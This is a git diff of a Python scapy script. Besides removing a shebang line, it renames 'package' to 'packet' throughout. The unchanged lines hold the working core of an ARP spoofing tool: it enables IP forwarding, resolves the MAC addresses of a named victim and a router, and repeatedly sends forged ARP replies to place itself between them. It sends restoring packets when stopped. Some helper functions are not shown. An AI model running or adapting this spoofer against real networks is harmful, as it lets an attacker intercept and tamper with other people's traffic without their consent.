@@ -1,5 +1,3 @@
-#! /home/paulomesquita/.pyenv/shims/python
-
 import scapy.all as scapy
 import time
 import argparse
@@ -50,35 +48,35 @@ def getMacWithIp(ip):
 def createArpResponse(destination_ip, source_ip, destination_mac, source_mac=None, spoof=True):
     packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip)
     if spoof == False and source_mac is not None:
-        printDinamically("[+] Creating unspoof package\n")
+        printDinamically("[+] Creating unspoof packet\n")
         packet.hwsrc=source_mac
     else:
-        printDinamically("[+] Creating spoof package\n")
+        printDinamically("[+] Creating spoof packet\n")
     return packet
 
 def printDinamically(text):
     print("\r {}".format(text), end="")
 
-def sendPackages(packages_list):
-    for package in packages_list:
-        scapy.send(package, verbose=False)
+def sendpackets(packets_list):
+    for packet in packets_list:
+        scapy.send(packet, verbose=False)
 
 try:
     ip_forwarding(True)
-    number_sent_packages = 0
+    number_sent_packets = 0
     options = get_arguments()
     machine_ip = options.victim
     router_ip = options.router
     machine_mac = getMacWithIp(machine_ip)
     router_mac = getMacWithIp(router_ip)
-    spoof_packages = [createArpResponse(machine_ip, router_ip, machine_mac), createArpResponse(router_ip, machine_ip, router_mac)]
-    unspoof_packages = [createArpResponse(machine_ip, router_ip, machine_mac, router_mac, False), createArpResponse(router_ip, machine_ip, router_mac, machine_mac, False)]
+    spoof_packets = [createArpResponse(machine_ip, router_ip, machine_mac), createArpResponse(router_ip, machine_ip, router_mac)]
+    unspoof_packets = [createArpResponse(machine_ip, router_ip, machine_mac, router_mac, False), createArpResponse(router_ip, machine_ip, router_mac, machine_mac, False)]
     while True:
-        sendPackages(spoof_packages)
-        number_sent_packages = number_sent_packages + len(spoof_packages)
-        printDinamically("[+] Sent {} spoof packages".format(number_sent_packages))
+        sendpackets(spoof_packets)
+        number_sent_packets = number_sent_packets + len(spoof_packets)
+        printDinamically("[+] Sent {} spoof packets".format(number_sent_packets))
         time.sleep(2)
 except KeyboardInterrupt as err:
     ip_forwarding(False)
-    printDinamically("\n [-] Stopping... Reverting changes\n [+] Sending {} unspoof packages\n".format(len(unspoof_packages)))
-    sendPackages(unspoof_packages)
+    printDinamically("\n [-] Stopping... Reverting changes\n [+] Sending {} unspoof packets\n".format(len(unspoof_packets)))
+    sendpackets(unspoof_packets)
